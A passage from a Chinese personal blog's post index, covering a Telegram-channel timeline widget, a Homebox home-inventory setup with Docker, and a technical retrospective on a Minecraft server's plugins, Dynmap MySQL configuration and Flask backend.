%&#125;&#123;% endtimeline %&#125;user为频道ID，api为你为CFW绑定的域名，type填memos碍于篇幅限制，只展示前3条 /source/_data/widgets.yml123456timeline: layout: timeline title: 近期动态 api: https://get-tg-channel-api.hzchu.top/?tag=DTA&amp;limit=3 type: memos hide: user,footer\t有一些功能在默认的设计下不能很好的实现，但是通过数据插件就可以实现了，比如动态加载更多内容，回应显示，访问量显示等 有空再写（挖坑.webp 其它用法 获取其它频道指定获取某条信息展示访问量使用Markdown 代码：123&#123;% timeline user:Thun888sDraftArticles api:https://get-tg-channel-api.hzchu.top/?cid=1&amp;tag=DTA&amp;limit=3 type:memos %&#125;&#123;% endtimeline %&#125; 代码：123&#123;% timeline user:Thun888sDraftArticles api:https://get-tg-channel-api.hzchu.top/?cid=1&amp;tag=Test&amp;mid=52&amp;showtag=false type:memos %&#125;&#123;% endtimeline %&#125;可以用在很多地方获取某些信息，作为某种接口来使用。在这一基础上，你甚至可以修改代码，改为只返回图片，在某种意义上实现图床的效果，不过滥用可不太好啊 代码：123&#123;% timeline user:Thun888sDraftArticles api:https://get-tg-channel-api.hzchu.top/?cid=1&amp;tag=Test&amp;showview=true type:memos %&#125;&#123;% endtimeline %&#125; 代码：123&#123;% timeline user:Thun888sDraftArticles api:https://get-tg-channel-api.hzchu.top/?cid=1&amp;tag=Test&amp;usemd=true type:memos %&#125;&#123;% endtimeline %&#125;在默认情况下，tg会解析md语法，对于不支持的语法会转义，从而导致前端无法正常解析md语法，在使用该参数后程序会将解析后的文本还原为正常md语法并返回。默认开启 相关配置： 1const ChannelNameList = [&#x27;thun888sthinks&#x27;,&#x27;Thun888sDraftArticles&#x27;]; 变体 反向筛选 将if (MessageTextMatch &amp;&amp; (!denied &amp;&amp; MessageTextMatch[0].includes('#' + tagname))) &#123;修改为if (MessageTextMatch &amp;&amp; (!denied || MessageTextMatch[0].includes('#' + tagname))) &#123; 文本筛选 将MessageTextMatch[0].includes('#' + tagname)修改为MessageTextMatch[0].includes('yourtext') Todo [x] 可在请求时选择过滤哪个tag [x] 完善Emoji支持 [x] 前端传入标签名 [x] 可选显示标签名及访问量 [x] 获取指定信息 [x] 多频道支持 [ ] 表情包标签解析 [ ] 自定义是否显示引用 [ ] 可传入需要返回的名称 [x] 可选使用tg自带分类 结语 它可以使静态博客进一步动态化，加强可玩性，也可在很多地方使用。 如果你有一些像多频道融合，多标签获取的功能建议，那就大可不必了，毕竟它一开始只是一个说说程序啊","tags":["Stellar"],"categories":["技术类"]},{"title":"使用Homebox实现家用物品管理","path":"/2024/使用Homebox实现家用物品管理/","content":"前言 很久之前，家里面有三把电动螺丝刀，然而前些阵子我想找一把来用都得找半天…… 假期回家，桌面太乱了一直被我妈批斗…… 思来想去这样也不行啊，上网找一下，发现了「Homebox」这个程序，开始干活吧。 安装 仓库中也有二进制文件，我这里直接用Docker部署 12345678# Run the image$ docker run -d \\ --name homebox \\ --restart unless-stopped \\ --publish 3100:7745 \\ --env TZ=Europe/Bucharest \\ --volume /path/to/data/folder/:/data \\ ghcr.io/hay-kot/homebox:latest 或用Docker-Compose 1234567891011121314151617181920version: &quot;3.4&quot;services: homebox: image: ghcr.io/hay-kot/homebox:latest# image: ghcr.io/hay-kot/homebox:latest-rootless container_name: homebox restart: always environment: - HBOX_LOG_LEVEL=info - HBOX_LOG_FORMAT=text - HBOX_WEB_MAX_UPLOAD_SIZE=10 volumes: - homebox-data:/data/ ports: - 3100:7745volumes: homebox-data: driver: local 因为还有可能给家里人用，干脆就nginx一条龙服务安排上，搭配家里面ADG上dns重写，家里人直接访问wms.hzchu.top就ok了 1708142670501.webp 1708145094118.webp 部署完成进去后注册一个账号登录即可 HomeBox简单介绍 知道它的功能才好干活嘛 相比于「GreaterWMS」，「ModernWMS」等专门用于仓库管理的软件，「Homebox」主打一个家用，因此它的操作也简单不少，在进去后可以看到这样的页面 1708159306854.webp Create–创建 在点开那个抹茶绿的按钮后，可以看到里面包括 Item/Asset,Location,Label 三个选项 Item/Asset：新建物品，即存入物品相关信息到程序里，里面包括以下填充项在填写完成后，若只新建单个物品，则会跳转至对应物品详情，可以做详细修改 1708161509640.webp Location： 新建位置，即存入某个物品存放处（如书桌）的相关信息到程序里，里面包括以下填充项在“父位置”中，可以设置其它已新建的”位置“，表示该位置属于某位置，比如这样1708162255778.webp 1708162163736.webp Label：新建类别，即存入某个物品类别（如电子产品）的相关信息到程序里，里面包括以下填充项 1708162409464.webp Home–主页 在加载完成时便是主页了，图片上面有，主要显示了物品总金额，物品、位置、类别总数，近期添加的5个物品，位置、类别列表 Locations–位置（树） 根据创建物品/位置时的父位置，程序会构建出一个层级树，简明地展现出它们之间的从属关系 1708165497793.webp Search–搜索 顾名思义 Profile–用户设置 直接上图片 Tools–工具 包括标签生成器，生成BOM表，导入导出CSV及一些修复工具 我主要用的是标签生成器，可以直接生成二维码贴在物品表面 1708182617875.webp 1708168353440.webp 调好参数右键打印即可 物品详情 很详细，但我除了数量和描述都用不上 存在页面切换bug，刷新即可解决 基本逻辑 为了能准确快速地找到对应存放处，我定了一套基本原则： 将几个房间用A/B…大写英文字母命名 存放处使用所属房间加数字命名 以房间门为起点，向右统计入库 对应垂直堆叠的存放处，从上往下（优先） 对应物品本体： 对与中等大小物品，使用上文提到的二维码标签， 小物品用一维码标签， 再小就不贴标签，改用荧光笔加胶布或直接跳过 整理时从俯视角度，按入库顺序从左往右，从上到下排列（可选） 对已有唯一标识码（sn码）的物品直接使用 程序内列了四个类别（感觉除了日后忘了物品名称关键词，用来筛选物品外其实没啥用）：大物件，小物件，收纳盒，电子产品 实际实施 因为一开始没发现自带的标签生成器，所以用了「E-Label」来生成一维码，单页85个标签 其中，A/B…表示该物品原属房间 标签内容填入物品描述中 https://pan.hzchu.top/s/q8SJ相关文件 还可以把文字缩掉，但考虑到一维码水平方向易被损坏还是留着吧 1708179344734.webp 1708180607272.webp 打印完标签贴到物品上，我这里先用胶布凑合以下，注意要同时覆盖字符及一部分条形码（如图片荧光标准所示）注：图示条形码为第一版 1708179885315.webp 不过还是太麻烦，所以我打算用这种带有不干胶的纸替代，不过因为春节还没到货 1708180983135.webp 总结 ​\t那么，工期呢？要对小到一颗纽扣电池进行统计本身就不是一件快事，整理一个小时才勉强整理完一张桌子，想全部整理完必然是一个大工程，慢慢来。但全部整理一次确实大有益处，比如我就找到了8年前在某购物广场办的会员卡（前一天才因为没有实体会员卡不给兑积分，这波雪中送炭），因为中途方案改变，要等这个打印纸，就先搁置下来了，才不是因为帕鲁太好玩了 导弹喵 续 自带的标签生成器中页面中仍有大量留白，实用性欠佳，有空想办法搓个更好用的打印机过个回南天病情恶化了，不是不能用（ 1708779215832.webp 可根据物品大小裁剪，在默认情况下规格约为48x21mm 1708779215823.webp 实际使用 var player = new DogePlayer({ container: document.getElementById('player_6cc3e893806c4850'), userId: 4322, vcode: '6cc3e893806c4850', autoPlay: false});","tags":["Homebox","家用"],"categories":["生活小事"]},{"title":"峰间云海服务器技术分析","path":"/2024/峰间云海服务器技术分析/","content":"前言 ​\t2023年的暑假，在我百般聊赖之际，网上冲浪时刷到了一个 mc服务器的视频。于是呼，心里萌发了一个想法——建立一个属于自己的服务器。在考虑的各种因素后，我选择了“纯生存”这个主题（之前都是玩命令的，很少沉下心来好好玩玩生存，也算是圆个心愿吧）。然后嘛，路走窄了，因为时机不恰当，稳定性欠佳，玩法单调等致命负面因素，好嘛，它没了（还活着，但在线玩家数量≤3罢了）。毕竟玩家数量跟投入的预算完全不成正比，没啥动力开，让我不禁想起了之前和酷安上一个老哥「Ifkn_271」合作，结果也是这样消失在互联网茫茫大海之中。 ​\t不过话说回来，还是有投入了很多精力在上面的，时至今日，随着「go-cqhttp」项目寿终正寝，加上自己硬盘爆炸带来的数据库丢失，目前只剩下核心的游戏服务端还能用了，今天写一篇文章来追悼怀念一下吧。 内容索引 MCDR插件及部分服务端配置 Dynmap设置MySQL存储及使用独立Web服务器 在线服务平台程序解析及部分代码片段 QQ机器人中自动添加离线用户白名单、聊天信息同步及图片上传 杂项 介绍 ​\t关于服务器的信息在这里可以看 ​\t当然，在上面没有涉及到技术部分。总的来说，一共涉及到了「服务端主体及相应插件」，「网页前端、后端」 ，「QQ机器人」， 「Dynmap」这几个部分，大体架构如下 以上，听我慢慢道来 游戏服务端 这方面大家各有不同，我这也不是最优选，就一笔带过 外围服务 ​\t由于当时没找到使用于fabric的登录插件，被迫增加了BC和一个独立的登录服务端。在前者我用了「Geyser」和「PixelMOTD」，一个用于转换be版于java版的通信协议，另一个用来处理motd请求，看起来更加高大上。后者用了雪之樱的整合包，并加了BungeeAutoJoinServer模组，在Authme登录事件结束后自动进入服务器。 ​\t虽然臃肿了点，但也有好处，比如防假人压测，motd攻击之类。 Geyser PixelMOTD BungeeAutoJoinServer MCDR 不懂Java，但又得对服务端运行做出干涉，这就得请出MCDReforged了 MCDReforged 清除掉落物 \\mcdr_server\\plugins\\cleandrops.py1234567891011121314151617181920212223242526PLUGIN_METADATA = &#123; &#x27;id&#x27;: &#x27;cleanitem&#x27;, &#x27;version&#x27;: &#x27;1.0.0&#x27;, &#x27;name&#x27;: &#x27;扫地僧&#x27;&#125;from mcdreforged.api.all import *import timedef clear_drops(server: PluginServerInterface): server.execute(&#x27;tellraw @a &#123;&quot;text&quot;:&quot;30秒后清除掉落物&quot;,&quot;color&quot;:&quot;yellow&quot;&#125;&#x27;) time.sleep(30) server.execute(&#x27;kill @e[type=item]&#x27;) server.execute(&#x27;tellraw @a &#123;&quot;text&quot;:&quot;掉落物已清除!&quot;,&quot;color&quot;:&quot;yellow&quot;&#125;&#x27;)def on_info(server: PluginServerInterface, info: Info): if info.content == &#x27;!!cleardrops&#x27;: clear_drops(server)@new_thread(PLUGIN_METADATA[&#x27;id&#x27;])def on_load(server, old): while True: clear_drops(server) time.sleep(86400) 插件运行在新的线程中，可以放心睡。当然，最好还是用「ClearDespawn」 聊天记录统计 \\mcdr_server\\plugins\\talk.py123456789101112131415161718192021222324252627282930313233343536PLUGIN_METADATA = &#123; &#x27;id&#x27;: &#x27;talksave&#x27;, &#x27;version&#x27;: &#x27;1.0.0&#x27;, &#x27;name&#x27;: &#x27;记录玩家聊天记录&#x27;&#125;#配置区域DATABASE = &#123; &#x27;host&#x27;: &#x27;127.0.0.1&#x27;, &#x27;user&#x27;: &#x27;user&#x27;, &#x27;password&#x27;: &#x27;password&#x27;, &#x27;database&#x27;: &#x27;database&#x27;&#125;import mysql.connectorfrom mcdreforged.api.all import *# def on_load(server, old):# server.logger.info(&#x27;Hello world!&#x27;)def on_user_info(server: PluginServerInterface, info: Info): # 获取玩家名和聊天消息内容 player = info.player message = info.content #server.logger.info(f&#x27;&#123;player&#125; 发送了消息：&#123;message&#125;&#x27;) if player is None or message is None: return if message.startswith(&#x27;!!MCDR&#x27;) or message.startswith(&#x27;!!plp&#x27;) or message.startswith(&#x27;!!day&#x27;) or message ==&quot;stop&quot; or message ==&quot;&quot; or message.startswith(&#x27;!!qb&#x27;) or message.startswith(&#x27;tellraw&#x27;) or message.startswith(&#x27;list&#x27;): return # 此部分判断是否为MCDR命令，可根据自己插件不同调整 # 也可与nb联动，同步信息到qq，不过我手抖把代码删了 conn= mysql.connector.connect(**DATABASE) cursor = conn.cursor() sql = &quot;INSERT INTO chat (playername, msg, time) VALUES (%s, %s, NOW())&quot; val = (player, message) cursor.execute(sql, val) conn.commit() cursor.close() 使用sudo pip install mysql-connector-python 安装依赖 1234567CREATE TABLE `mcserve`.`chat` ( `id` int NOT NULL, `playername` varchar(255) NULL, `msg` varchar(255) NULL, `time` datetime NULL, PRIMARY KEY (`id`)); 记录聊天记录到数据库，日后可以查询 「银行」 用下界合金为货币，存储到数据库中，本想和商店搭配使用的，没写完就不放了 服务端本体 既然是生存，必然绕不开一些生电类机器，无脑投入carpet的怀抱 Tab玩家列表用styledplayerlist微调了下 \\server\\config\\styledplayerlist\\styles\\default.json1234567891011121314&#123; &quot;style_name&quot;: &quot;Default&quot;, &quot;update_tick_time&quot;: 20, &quot;list_header&quot;: [ &quot;&lt;gr:#ff6c00:#ff6c00&gt;&lt;bold&gt;峰间云海&lt;/bold&gt;&lt;/gr&gt;&quot;, &quot;&lt;color:#555555&gt;&lt;strikethrough&gt; &lt;/strikethrough&gt;[ &lt;/color&gt;&lt;color:#FF5555&gt;%server:online%&lt;color:#6666676&gt;/&lt;/color&gt;%server:max_players%&lt;/color&gt;&lt;color:#555555&gt; ]&lt;strikethrough&gt; &lt;/strikethrough&gt;&lt;/color&gt;&quot; ], &quot;list_footer&quot;: [ &quot;&lt;color:#555555&gt;&lt;strikethrough&gt; &lt;/strikethrough&gt;&lt;/color&gt;&quot;, &quot;&lt;gray&gt;TPS: %server:tps_colored% &lt;dark_gray&gt;|&lt;/dark_gray&gt;&lt;gray&gt; MSPT: %server:mspt_colored% &lt;dark_gray&gt;|&lt;/dark_gray&gt; &lt;gray&gt;RAM: &lt;color:#54fc54&gt;%server:used_ram%/%server:max_ram%MB&lt;/color&gt; &lt;dark_gray&gt;|&lt;/dark_gray&gt; &lt;gray&gt;Ping: &lt;color:#ffba26&gt;%player:ping%ms&lt;/color&gt;&quot;, &quot;&lt;gray&gt;游戏时间：%world:time% &lt;dark_gray&gt;|&lt;/dark_gray&gt; &lt;gray&gt;现实时间：%server:time% &lt;dark_gray&gt;|&lt;/dark_gray&gt; &lt;gray&gt;实体数量：%world:mob_count%&quot; ], &quot;hidden_in_commands&quot;: false&#125; Simple Voice Chat 平时还有几条frp线路备用，而SVC默认使用当前连接的ip+24454进行连接，导致使用frp线路时无法使用，只好在配置里指定连接host \\config\\voicechat\\voicechat-server.properties:2912345# The host name that clients should use to connect to the voice chat# This may also include a port, e.g. &#x27;example.com:24454&#x27;# Don&#x27;t change this value if you don&#x27;t know what you are doingvoice_host=mcvoice.hzchu.top\\:24454# 其它设置无需调整 需开放UDP协议！ 其它就没什么改动了，添加的插件列表在这里 外围应用 Dynmap 如官方简介里说的一样，这是一个Google Maps-like map for your Minecraft server，可以把服务器存档渲染成像谷歌地图般的在线网页供其他人查看 通常情况下，大部分人装好就直接用了，可能再反代一下默认的8123端口，定个自定义路径访问。不过聪明的你从上面的架构图中应该已经发现了不同。没看清？再看一次 flowchart LR A[User] |visit or talk| B[Dynmap Forestage] B C(MySQL) C D[Dynmap Backstage] 为了实现上述访问流程，需要对原有设置做出一定调整 我参考了这篇文章，国内好像还没人写过，我就当个搬运工，绝对不是水字数。 https://bleepcoder.com/cn/dynmap/493645860/tutorial-setting-up-a-standalone-web-server-with-mysqlhttps://bleepcoder.com/cn/dynmap/493645860/tutorial-setting-up-a-standalone-web-server-with-mysql 首先先新建一个数据库，如果能设置允许访问范围的话最好只包括本机和服务端的ip 修改以下配置 更改前\\dynmap\\configuration.txt:281234567891011121314storage: # Filetree storage (standard tree of image files for maps) type: filetree # SQLite db for map storage (uses dbfile as storage location) #type: sqlite #dbfile: dynmap.db # MySQL DB for map storage (at &#x27;hostname&#x27;:&#x27;port&#x27; with flags &quot;flags&quot; in database &#x27;database&#x27; using user &#x27;userid&#x27; password &#x27;password&#x27; and table prefix &#x27;prefix&#x27;) #type: mysql #hostname: localhost #port: 3306 #database: dynmap #userid: dynmap #password: dynmap #prefix: &quot;&quot; 更改后\\dynmap\\configuration.txt:281234567891011121314storage: # Filetree storage (standard tree of image files for maps) #type: filetree &lt;- DONT FORGET TO COMMENT THIS OUT # SQLite db for map storage (uses dbfile as storage location) #type: sqlite #dbfile: dynmap.db # MySQL DB for map storage (at &#x27;hostname&#x27;:&#x27;port&#x27; with flags &quot;flags&quot; in database &#x27;database&#x27; using user &#x27;userid&#x27; password &#x27;password&#x27; and table prefix &#x27;prefix&#x27;) type: mysql hostname: &lt;mysql_ip&gt; port: &lt;mysql_port&gt; database: &lt;mysql_database&gt; userid: &lt;dynmap_mysql_user&gt; password: &lt;dynmap_mysql_password&gt; prefix: &quot;&quot; # Can add prefix for tables if you want 如果使用SQLite取消对应注释即可，路径可写绝对路径，把数据库放到硬盘空间充足的地方 随后，注释掉- class: org.dynmap.InternalClientUpdateComponent所有内容并取消注释- class: org.dynmap.JsonFileClientUpdateComponent所有内容 所修改内容 更改前\\dynmap\\configuration.txt:54123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657- class: org.dynmap.InternalClientUpdateComponent sendhealth: true sendposition: true allowwebchat: true webchat-interval: 5 hidewebchatip: true trustclientname: false includehiddenplayers: false # (optional) if true, color codes in player display names are used use-name-colors: false # (optional) if true, player login IDs will be used for web chat when their IPs match use-player-login-ip: true # (optional) if use-player-login-ip is true, setting this to true will cause chat messages not matching a known player IP to be ignored require-player-login-ip: false # (optional) block player login IDs that are banned from chatting block-banned-player-chat: true # Require login for web-to-server chat (requires login-enabled: true) webchat-requires-login: false # If set to true, users must have dynmap.webchat permission in order to chat webchat-permissions: false # Limit length of single chat messages chatlengthlimit: 256# # Optional - make players hidden when they are inside/underground/in shadows (#=light level: 0=full shadow,15=sky)# hideifshadow: 4# # Optional - make player hidden when they are under cover (#=sky light level,0=underground,15=open to sky)# hideifundercover: 14# # (Optional) if true, players that are crouching/sneaking will be hidden hideifsneaking: false # If true, player positions/status is protected (login with ID with dynmap.playermarkers.seeall permission required for info other than self) protected-player-info: false # If true, hide players with invisibility potion effects active hide-if-invisiblity-potion: true # If true, player names are not shown on map, chat, list hidenames: false#- class: org.dynmap.JsonFileClientUpdateComponent# writeinterval: 1# sendhealth: true# sendposition: true# allowwebchat: true# webchat-interval: 5# hidewebchatip: false# includehiddenplayers: false# use-name-colors: false# use-player-login-ip: false# require-player-login-ip: false# block-banned-player-chat: true# hideifshadow: 0# hideifundercover: 0# hideifsneaking: false# # Require login for web-to-server chat (requires login-enabled: true)# webchat-requires-login: false# # If set to true, users must have dynmap.webchat permission in order to chat# webchat-permissions: false# # Limit length of single chat messages# chatlengthlimit: 256# hide-if-invisiblity-potion: true# hidenames: false 更改后\\dynmap\\configuration.txt:54123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# - class: org.dynmap.InternalClientUpdateComponent #sendhealth: true #sendposition: true #allowwebchat: true #webchat-interval: 5 #hidewebchatip: false #trustclientname: false #includehiddenplayers: false # (optional) if true, color codes in player display names are used #use-name-colors: false # (optional) if true, player login IDs will be used for web chat when their IPs match #use-player-login-ip: true # (optional) if use-player-login-ip is true, setting this to true will cause chat messages not matching a known player IP to be ignored #require-player-login-ip: false # (optional) block player login IDs that are banned from chatting #block-banned-player-chat: true # Require login for web-to-server chat (requires login-enabled: true) #webchat-requires-login: false # If set to true, users must have dynmap.webchat permission in order to chat #webchat-permissions: false # Limit length of single chat messages #chatlengthlimit: 256 # # Optional - make players hidden when they are inside/underground/in shadows (#=light level: 0=full shadow,15=sky) # hideifshadow: 4 # # Optional - make player hidden when they are under cover (#=sky light level,0=underground,15=open to sky) # hideifundercover: 14 # # (Optional) if true, players that are crouching/sneaking will be hidden #hideifsneaking: false # If true, player positions/status is protected (login with ID with dynmap.playermarkers.seeall permission required for info other than self) #protected-player-info: false # If true, hide players with invisibility potion effects active #hide-if-invisiblity-potion: true # If true, player names are not shown on map, chat, list #hidenames: false - class: org.dynmap.JsonFileClientUpdateComponent writeinterval: 1 sendhealth: true sendposition: true allowwebchat: true webchat-interval: 5 hidewebchatip: false includehiddenplayers: false use-name-colors: false use-player-login-ip: false require-player-login-ip: false block-banned-player-chat: true hideifshadow: 0 hideifundercover: 0 hideifsneaking: false # # Require login for web-to-server chat (requires login-enabled: true) webchat-requires-login: false # # If set to true, users must have dynmap.webchat permission in order to chat webchat-permissions: false # # Limit length of single chat messages chatlengthlimit: 256 hide-if-invisiblity-potion: true hidenames: false 然后找到disable-webserver并将值从false更改为 true 以禁用内部网页服务器 再修改相应的请求地址（url:） 更改前\\dynmap\\configuration.txt:441123456789101112131415url: # configuration URL #configuration: &quot;up/configuration&quot; # update URL #update: &quot;up/world/&#123;world&#125;/&#123;timestamp&#125;&quot; # sendmessage URL #sendmessage: &quot;up/sendmessage&quot; # login URL #login: &quot;up/login&quot; # register URL #register: &quot;up/register&quot; # tiles base URL #tiles: &quot;tiles/&quot; # markers base URL #markers: &quot;tiles/&quot; MySQL\\dynmap\\configuration.txt:441123456789101112131415url: # configuration URL configuration: &quot;standalone/MySQL_configuration.php&quot; # update URL update: &quot;standalone/MySQL_update.php?world=&#123;world&#125;&amp;ts=&#123;timestamp&#125;&quot; # sendmessage URL sendmessage: &quot;standalone/MySQL_sendmessage.php&quot; # login URL login: &quot;standalone/MySQL_login.php&quot; # register URL register: &quot;standalone/MySQL_register.php&quot; # tiles base URL tiles: &quot;standalone/MySQL_tiles.php?tile=&quot; # markers base URL markers: &quot;standalone/MySQL_markers.php?marker=&quot; SQLite\\dynmap\\configuration.txt:441123456789101112131415url: # configuration URL configuration: &quot;standalone/configuration.php&quot; # update URL update: &quot;standalone/update.php?world=&#123;world&#125;&amp;ts=&#123;timestamp&#125;&quot; # sendmessage URL sendmessage: &quot;standalone/sendmessage.php&quot; # login URL login: &quot;standalone/login.php&quot; # register URL register: &quot;standalone/register.php&quot; # tiles base URL tiles: &quot;standalone/tiles.php?tile=&quot; # markers base URL markers: &quot;standalone/markers.php?marker=&quot; Dynmap还支持MariaDB、PostgreSQL及S3存储。使用MariaDB的话将type: mysql 改为 type: mariadb ，PostgreSQL 改为 type: postgres 并将 url: 中的 MySQL_ 替换为 PostgreSQL_ 。至于S3，太豪气了应该没人用吧，自建当我没说（小声bb 最后修改一下配置文件中前端的地址（会在游戏中显示） \\dynmap\\configuration.txt:478123# Published public URL for Dynmap server (allows users to use &#x27;dynmap url&#x27; command to get public URL usable to access server# If not set, &#x27;dynmap url&#x27; will not return anything. URL should be fully qualified (e.g. https://mc.westeroscraft.com/)publicURL: https://yourdomain.com/ 安装用于MySQL的java驱动包 非MySQL存储可跳过 MySQL_JDBC_(Fabric/Forge)https://www.curseforge.com/minecraft/mc-mods/mysql-jdbc/files 下载后放入 mods 文件夹 试运行 ​\t开启服务端，观察日志输出中有无报错，同时检查数据库中是否有数据表生成 成功运行后配置网页前端。先安装PHP-7.4（实测8.0会存在bug无法登录），将...\\dynmap\\web下所有文件复制到网页根目录即可。（模组在启动后会自动完成配置，以配置mysql为存储为例，配置会写入 \\standalone\\config.js和 \\web\\standalone\\MySQL_config.php）如果数据库无法访问可尝试手动设置$dbhost为127.0.0.1 打开看看吧~ 哦？一片漆黑，因为这时候还没有执行渲染命令，dynmap还没工作，因此我们可以执行 /dynmap radiusrender world 0 0 10来对主世界出生点周围进行渲染，并查看中有无数据写入到tiles表中 初步测试完成后就可以执行 /dynmap fullrender world 渲染整个世界了。 前端我做了一定修改，有兴趣可以下载看看： https://pan.hzchu.top/s/MWU7?password=uzyj8yhttps://pan.hzchu.top/s/MWU7?password=uzyj8y 注意：该地图会对性能及带宽占用上造成一定影响，请参考网上其他调优资料，根据自身实际情况调整 在线服务 峰间云海 (hzchu.top) 与其叫做官网，倒不如说是一个 综合服务平台 ， 当初想着与其整个花里胡哨的页面，不如整个有用的。虽然事实证明还是花哨的好。 前端 因为当时赶工期， 从头学各种框架来不及，用Py写了个拼凑html的程序，基本能用，后面MRUI也延续了这套，后续如果有空改进下。 基本是开箱即用了 功能在后面混着讲 后端 **首页：**状态检测使用了mcstatus库，具体操作可以参考mcstatus · PyPI。公告用了Artalk，歪门邪道 聊天记录： main.py1234567891011121314151617181920212223242526272829303132@app.route(&#x27;/user/msg&#x27;, methods=[&#x27;GET&#x27;])def getmsg(): num = request.args.get(&#x27;num&#x27;, default=0, type=int) # 限制访问前200条记录 if num &gt; 160: messages = [] message = &#123; &#x27;id&#x27;: 0, &#x27;playername&#x27;: &quot;Null&quot;, &#x27;msg&#x27;: &quot;200条后不予查看&quot;, &#x27;time&#x27;: &quot;Null&quot; &#125; messages.append(message) return jsonify(messages), 200 conn= mysql.connector.connect(**DATABASE) cursor = conn.cursor() sql = &quot;SELECT id, playername, msg, time FROM chat ORDER BY id DESC LIMIT %s, %s&quot; cursor.execute(sql, (num, 40)) result = cursor.fetchall() cursor.close() messages = [] for row in result: message = &#123; &#x27;id&#x27;: row[0], &#x27;playername&#x27;: row[1], &#x27;msg&#x27;: row[2], &#x27;time&#x27;: row[3].strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;) &#125; messages.append(message) return jsonify(messages), 200 在前端页面中，我是直接用了表格的形式显示，不够好看，原草稿大概是这样，可惜没时间 用于当时忘了xss处理，要在前端补上 1234567891011// msg.textContent = dexss(player.msg);function dexss(str, kwargs) &#123; return (&#x27;&#x27; + str) .replace(/&amp;/g, &#x27;&amp;amp;&#x27;) .replace(/&lt;/g, &#x27;&amp;lt;&#x27;) // DEC=&gt; &amp;#60; HEX=&gt; &amp;#x3c; Entity=&gt; &amp;lt; .replace(/&gt;/g, &#x27;&amp;gt;&#x27;) .replace(/&quot;/g, &#x27;&amp;quot;&#x27;) .replace(/&#x27;/g, &#x27;&amp;#x27;&#x27;) // &amp;apos; 不推荐，因为它不在HTML规范中 .replace(/\\//g, &#x27;&amp;#x2F;&#x27;);&#125;; 相册： 这部分与前者差不多，前端网上随便找了个改了改，现在想想直接用Lsky pro的画廊就行了 此部分仅为读取，写入的部分由QQ机器人负责 main.py12345678910111213141516171819202122232425262728293031@app.route(&#x27;/user/photo&#x27;, methods=[&#x27;GET&#x27;])def get_data(): num = request.args.get(&#x27;num&#x27;, default=0, type=int) conn= mysql.connector.connect(**DATABASE) cursor = conn.cursor() try: query = &quot;SELECT id, nickname, author, time, url FROM photo ORDER BY id DESC LIMIT %s, %s&quot; cursor.execute(query, (num, 24)) results = cursor.fetchall() # 将查询结果转换为字典列表 data = [] for row in results: data.append(&#123; &#x27;id&#x27;: row[0], &#x27;nickname&#x27;: row[1], &#x27;author&#x27;: row[2], &#x27;time&#x27;: row[3], &#x27;url&#x27;: row[4] &#125;) return jsonify(data) except Exception as e: return jsonify(&#123;&#x27;error&#x27;: str(e)&#125;) finally: cursor.close() conn.close() 坐标&amp;反馈： 缩水了，用Artalk替代了，只能说与我计划中差的有亿点多 排行榜： ​\t这就有点意思了，为了实现这些数据统计，我在游戏中新建了若干的计分板+一些在常加载区块里的命令方块，随后每隔一段时间读取存档里的存储着计分板数据的文件（\\world\\data\\scoreboard.dat），将数值计入数据库。（起初使用Rcon执行命令显示该玩家所有计分板数据并使用正则表达式提取再存入，前期还好，到后来对性能影响太大被迫改进） ​\t游戏里的命令就不说了，需求也不一定相同，网上一大把教程 https://www.bilibili.com/read/cv12839156/https://www.bilibili.com/read/cv12839156/ ​\t在实际程序中，为了简化主程序的复杂程度（拉侧边滚动条都拉出火花了），我把新定义的函数放在extra.py里 extra.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import mysql.connectorimport python_nbt.nbt as nbtimport jsonimport timedef get_scoreboard(scoreboard_name):# 将字符串转换为 Python 对象 start_time = time.time() file = nbt.read_from_nbt_file(&quot;D:\\MCC\\mcdr_server\\server\\world\\data\\scoreboard.dat&quot;) string_data = str(file) # print(string_data) python_object = ast.literal_eval(string_data) # 将 Python 对象转换为 JSON 字符串 json_data = json.dumps(python_object) data = json.loads(json_data) # print(json_data) # print(data[&quot;value&quot;][&quot;data&quot;][&quot;value&quot;][&quot;PlayerScores&quot;][&quot;value&quot;]) data = data[&quot;value&quot;][&quot;data&quot;][&quot;value&quot;][&quot;PlayerScores&quot;][&quot;value&quot;] for i in data: if i[&quot;Objective&quot;][&quot;value&quot;] == scoreboard_name: name = i[&quot;Name&quot;][&quot;value&quot;] score = i[&quot;Score&quot;][&quot;value&quot;] #print(name,&quot;:&quot;,score) conn= mysql.connector.connect(**DATABASE) cursor = conn.cursor() try: insert_query = &quot;INSERT INTO scoreboard (player, &#123;&#125;) VALUES (%s, %s) ON DUPLICATE KEY UPDATE &#123;&#125; = %s&quot;.format(scoreboard_name, scoreboard_name) data = (name, score, score) cursor.execute(insert_query, data) conn.commit() except Exception as e: print(str(e)) finally: cursor.close() conn.close() # 记录结束时间 end_time = time.time() # 计算执行时间 execution_time = end_time - start_time # 打印执行时间 return(execution_time) ​\t该函数回返回执行时间，不过没用错误处理，虽然一般情况下不会发生错误，不过最好也改进下再用 main.py12345678910111213141516171819202122232425import threadingimport timeimport extradef updatabase(): time_used = extra.get_scoreboard(&quot;pickaxe_total&quot;) time_used = time_used + extra.get_scoreboard(&quot;gametime&quot;) time_used = time_used + extra.get_scoreboard(&quot;Kills&quot;) time_used = time_used + extra.get_scoreboard(&quot;fish&quot;) time_used = time_used + extra.get_scoreboard(&quot;xp&quot;) time_used =&quot; &#123;:.3f&#125;&quot;.format(time_used) #msg_type = &quot;System-AutoTasks&quot; #msg_value = &quot;计分板同步成功，耗时:&quot; + str(time_used) + &quot;秒&quot; #extra.eventssave(msg_type,msg_value) # 用于日志保存，可去掉 def run_timer(): while True: # 每2h执行一次 # 简单粗暴，实际使用请使用schedule库 time.sleep(2* 60 * 60) # 在后台线程中执行需要定时执行的函数 threading.Thread(target=updatabase).start() 通过以下路由返回数据 main.py123456789@app.route(&#x27;/user/scoreboard&#x27;)def get_scoreboard(): cnx = mysql.connector.connect(**DATABASE) cursor = cnx.cursor() query = &quot;SELECT * FROM scoreboard&quot; cursor.execute(query) data = [&#123;&#x27;playername&#x27;: row[0], &#x27;pickaxe_total&#x27;: row[1], &#x27;gametime&#x27;: row[2], &#x27;Kills&#x27;: row[3], &#x27;fish&#x27;: row[4], &#x27;xp&#x27;: row[5]&#125; for row in cursor.fetchall()] cursor.close() return jsonify(data) 前端用了AI帮忙，太折磨人了。 